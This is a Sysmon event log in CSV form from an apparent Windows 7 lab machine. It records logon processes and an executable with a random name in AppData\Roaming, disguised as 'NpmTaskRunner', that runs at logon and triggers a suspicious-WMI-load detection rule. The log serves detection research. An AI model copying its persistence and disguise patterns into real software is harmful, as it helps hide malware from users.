,Catalog,Category,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,Guid,Installer,Keywords,Level,Lspname,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Image,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Processguid,Processid,Product,Rulename,Terminalsessionid,User,Utctime,Creationutctime,Targetfilename,Details,Eventtype,Targetobject,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Name,Operation,Type,Consumer,Filter,Eventnamespace,Query,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid
10,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,5,7545,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,5,2019-06-14T22:22:52.503995700Z,3,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,,,,2019-06-14 22:22:52.503,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
11,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7546,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.441495700Z,5,\SystemRoot\System32\smss.exe 00000000 00000040 ,Microsoft Corporation,C:\Windows\,Windows Session Manager,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=6EBCD58670607B00DD138AB5BC22C2359A9551CE,MD5=899FAA235BD35DABE1C2505CE313AD5F,SHA256=AB17ADE22FD2E24CAC554F4FB9C84A810B8C377F09A49762F6616DA49E653141,IMPHASH=263C3FFA2FD990E9BAE492989A61AF52",C:\Windows\System32\smss.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe,C:\Windows\System32\smss.exe,{365ABB72-9C13-5D04-0000-0010472D0000},264,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.394,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7547,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.503995700Z,5,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",Microsoft Corporation,C:\Windows\system32,Client Server Runtime Process,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=53BC9B2AE89FCAD6197EC519AE588F926C88E460,MD5=342271F6142E7C70805B8A81E1BA5F5C,SHA256=F9112B88FEC5EF10A7AEDF88DCEE61956D1FCDE7CB42197216E8265578713786,IMPHASH=A801AE60E0B3E5643B92C006DA96F0E0",C:\Windows\System32\csrss.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe 00000000 00000040 ,C:\Windows\System32\smss.exe,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,{365ABB72-1E3F-5D04-0000-0010568A0B00},488,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.410,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
13,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7548,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.566495700Z,5,winlogon.exe,Microsoft Corporation,C:\Windows\system32,Windows Logon Application,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=B7F3D71BD568CBD15C6C3445042FCBEB322E8072,MD5=52449FD429D6053B78AE564DEF303870,SHA256=473E42C5B48493C84CF1B22D054AD1C788FCE3603E439ABC77A3B37DACFF9F1C,IMPHASH=017962B1BE2C625ABB0F1195D008BD45",C:\Windows\System32\winlogon.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe 00000000 00000040 ,C:\Windows\System32\smss.exe,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.550,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
14,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7549,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.707120700Z,5,"""LogonUI.exe"" /flags:0x0",Microsoft Corporation,C:\Windows\system32\,Windows Logon User Interface Host,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=6FCAD4F6BB71049744D25F2B53A651AC5AA79187,MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6,IMPHASH=B8FCE86F8F679B9FC7368F8F47778678",C:\Windows\System32\LogonUI.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E3F-5D04-0000-00102B9C0B00},948,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.707,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
15,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7552,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:06.691495700Z,5,C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E},Microsoft Corporation,C:\Windows\system32\,COM Surrogate,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829",C:\Windows\System32\dllhost.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-9C16-5D04-0000-001006790000},616,{365ABB72-1E4A-5D04-0000-0010ECC20B00},2128,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-06-14 22:23:06.660,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
16,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7553,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:07.019620700Z,5,efsui.exe /efs /keybackup,Microsoft Corporation,C:\Windows\system32\,EFS UI Application,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=52E9D30B60AF28E5E65223E5894517AEF9D3F638,MD5=BCB88EED0CD8632A6167427D8032C39C,SHA256=C2935B32480BAC58583D4C1D9D7ED79743E07AF3877D93D343C59BD37DE8D0B6,IMPHASH=88F5B8A224E2F6213BCEF481DFF428B6",C:\Windows\System32\efsui.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\lsass.exe,C:\Windows\System32\lsass.exe,{365ABB72-9C16-5D04-0000-001085610000},496,{365ABB72-1E4A-5D04-0000-0010BACF0B00},2264,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:06.738,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
17,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7554,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:07.082120700Z,5,atbroker.exe,Microsoft Corporation,C:\Windows\system32\,Transitions Accessible technologies between desktops,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=1B376C177C5629C0E620431AF1A9E8C16BF23D53,MD5=3CA2BB895E204478C7A4C9BAF70970CE,SHA256=DE3196627BC810DD22F58DEE65747BACA25485CCD0CEE2701055ECE1058F1C6A,IMPHASH=4B8AA723CCFC5B2FBA6ED3D8F3557DE3",C:\Windows\System32\AtBroker.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E4A-5D04-0000-001016D70B00},1628,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:06.769,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
18,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7555,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.894620700Z,5,C:\Windows\system32\userinit.exe,Microsoft Corporation,C:\Windows\system32\,Userinit Logon Application,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=211295CCDA6CF6409189279BF66A212BD53FC650,MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B,IMPHASH=DA2666D3347F129193AB91A0EAB85C0C",C:\Windows\System32\userinit.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E51-5D04-0000-00104C340C00},3448,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:13.894,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
19,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7556,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.957120700Z,5,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",,C:\Windows\system32\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\userinit.exe,C:\Windows\System32\userinit.exe,{365ABB72-1E51-5D04-0000-00104C340C00},3448,{365ABB72-1E51-5D04-0000-00107B380C00},3444,NpmTaskRunner,,2,IEWIN7\IEUser,2019-06-14 22:23:13.925,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
20,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7557,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.972745700Z,5,C:\Windows\Explorer.EXE,Microsoft Corporation,C:\Windows\system32\,Windows Explorer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=1643E6D0265EB60B0753CDC9C283D843B988E1D5,MD5=6DDCA324434FFA506CF7DC4E51DB7935,SHA256=11D69FB388FF59E5BA6CA217CA04ECDE6A38FA8FB306AA5F1B72E22BB7C3A25A,IMPHASH=F0EE25FD4D9035DAD1913FAFFD4A4B87",C:\Windows\explorer.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\userinit.exe,C:\Windows\System32\userinit.exe,{365ABB72-1E51-5D04-0000-00104C340C00},3448,{365ABB72-1E51-5D04-0000-001065390C00},3620,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:13.957,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
21,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7558,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:15.054777000Z,5,"""C:\Windows\System32\VBoxTray.exe"" ",Oracle Corporation,C:\Windows\system32\,VirtualBox Guest Additions Tray Application,5.1.30.118389,"SHA1=85AD42F7238612E2940133814C32837993672F32,MD5=A06C028F679788066C2E6B4E4C463B51,SHA256=796B84A6EE1F8146A5685069E1DADD7D9A02E593501FF31BB516E5E828020CF8,IMPHASH=E674A2E741B5EE0A1FC1192405721321",C:\Windows\System32\VBoxTray.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1E51-5D04-0000-001065390C00},3620,{365ABB72-1E52-5D04-0000-00101D700C00},3920,Oracle VM VirtualBox Guest Additions,,2,IEWIN7\IEUser,2019-06-14 22:23:14.472,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
22,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7559,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:16.592862900Z,5,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",,C:\Windows\system32\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,{365ABB72-1E51-5D04-0000-00107B380C00},3444,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,NpmTaskRunner,,2,IEWIN7\IEUser,2019-06-14 22:23:16.577,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
23,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7562,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:23.405362900Z,5,"""C:\Windows\system32\eventvwr.exe"" ",Microsoft Corporation,C:\Users\IEUser\,Event Viewer Snapin Launcher,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ADA934DA7A0D40FA0F54652687F762B82EA5F27E,MD5=91415D7EB992B77410145DD5FE453D25,SHA256=2F515E9662CA785A9C877E81BE1D52879EF4741BBDE3213550A3C077127436C2,IMPHASH=7CAE841724AAC4485D1A064D5F0E471F",C:\Windows\System32\eventvwr.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1E51-5D04-0000-001065390C00},3620,{365ABB72-1E5B-5D04-0000-00109EF80C00},2040,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:23.389,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
24,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,7,7563,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,7,2019-06-14T22:23:26.811612900Z,3,,Microsoft Corporation,,WMI,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=03DC8ABDF9C9948FE6E783DCA9C6C8264D635F0A,MD5=5610B0425518D185331CB8E968D060E6,SHA256=E235186C3BF266EE9EC733D2CFF35E3A65DE039C19B14260F4054F34B5E8AD41,IMPHASH=523D1DB34FC36465E35F6201A2FD561B",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,,,,,,,,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,Microsoft® Windows® Operating System,Execution - Suspicious WMI module load,,,2019-06-14 22:23:26.811,,,,,,C:\Windows\System32\wbem\wmiutils.dll,Microsoft Windows,Valid,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
